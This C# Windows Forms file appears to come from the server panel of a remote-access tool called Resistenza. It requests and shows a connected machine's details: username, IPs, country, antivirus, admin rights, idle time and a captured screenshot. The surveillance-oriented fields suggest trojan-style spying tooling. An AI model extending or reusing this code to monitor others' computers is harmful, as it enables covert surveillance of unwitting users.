using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using Resistenza.Server.Networking;
using Resistenza.Common.Packets;
using Resistenza.Common.Packets.MachineInformation;
using Microsoft.Win32.SafeHandles;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;
using System.Drawing.Imaging;

namespace Resistenza.Server.Forms
{
    public partial class SystemInfoFrm : Form
    {
        public SystemInfoFrm(ConnectedClient Client)
        {
            InitializeComponent();

            _Client = Client;
            _Client.IncomingPacket += _Client_IncomingPacket;

        }

        private void _Client_IncomingPacket(object PacketReceived)
        {
            switch (PacketReceived)
            {
                case ExtendedComputerInfoResponse:

                    ExtendedComputerInfoResponse ConvertedResponse = (ExtendedComputerInfoResponse)PacketReceived;

                    OsResponseLabel.Text = ConvertedResponse.OperatingSytem;
                    ArchitectureResponseLabel.Text = ConvertedResponse.Architecture;
                    ProcessorResponseLabel.Text = ConvertedResponse.Processor;
                    MemoryResponseLabel.Text = ConvertedResponse.Memory;
                    GpuResponseLabel.Text = ConvertedResponse.GPU;
                    UsernameResponseLabel.Text = ConvertedResponse.Username;
                    PcNameResponseLabel.Text = ConvertedResponse.PCName;
                    DomainNameResponseLabel.Text = ConvertedResponse.DomainName;
                    HostNameResponseLabel.Text = ConvertedResponse.HostName;
                    SystemDriveResponseLabel.Text = ConvertedResponse.SystemDrive;
                    UpTimeResponseLabel.Text = ConvertedResponse.UpTime;
                    MacResponseLabel.Text = ConvertedResponse.MAC;
                    LANResponseLabel.Text = ConvertedResponse.LanIp;
                    WANResponseLabel.Text = ConvertedResponse.WanIp;
                    CountryResponseLabel.Text = ConvertedResponse.Country;
                    ISPResponseLabel.Text = ConvertedResponse.ISP;
                    AntivirusResponseLabel.Text = ConvertedResponse.Antivirus;
                    AdministratorResponseLabel.Text = ConvertedResponse.IsAdmin;
                    LocalTimeResponseLabel.Text = ConvertedResponse.LocalTime;
                    LastInputResponseLabel.Text = ConvertedResponse.SecondsFromLastInput;
                    MainDriveStorageResponseLabel.Text = ConvertedResponse.MainDriveSize;

                    //ricostruisco l'immagine dai bytes

                    using (MemoryStream ms = new MemoryStream(ConvertedResponse.ScreenshotBytes))
                    {
                        Image Screen = Image.FromStream(ms);
                        ScreenshotPicturebox.Image = Screen;
                        ScreenshotPicturebox.SizeMode = PictureBoxSizeMode.StretchImage;
                        downloadIcon.Visible = true;
                    }











                    break;
            }

        }

        private ConnectedClient _Client;


        private async void SystemInfoFrm_Load(object sender, EventArgs e)
        {

            var InfoRequest = new ExtendedComputerInfoRequest();

            await _Client.CustomStream.SendPacketAsync(InfoRequest);


        }

        private void downloadIcon_Click(object sender, EventArgs e)
        {
            SaveFileDialog s = new SaveFileDialog();
            s.FileName = _Client.IpAddress.Length < 15 ? $"{_Client.IpAddress}_screenshot" : "screenshot"; //ipv6 has invalid characters for windows paths
            s.DefaultExt = ".png";
            s.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            s.Filter = "Picture (*.png)|*.png";


            if (s.ShowDialog() == DialogResult.OK)
            {
                // Save Image
                string filename = s.FileName;
                Image image = ScreenshotPicturebox.Image;
                image.Save(filename);


            }
        }
    }
}
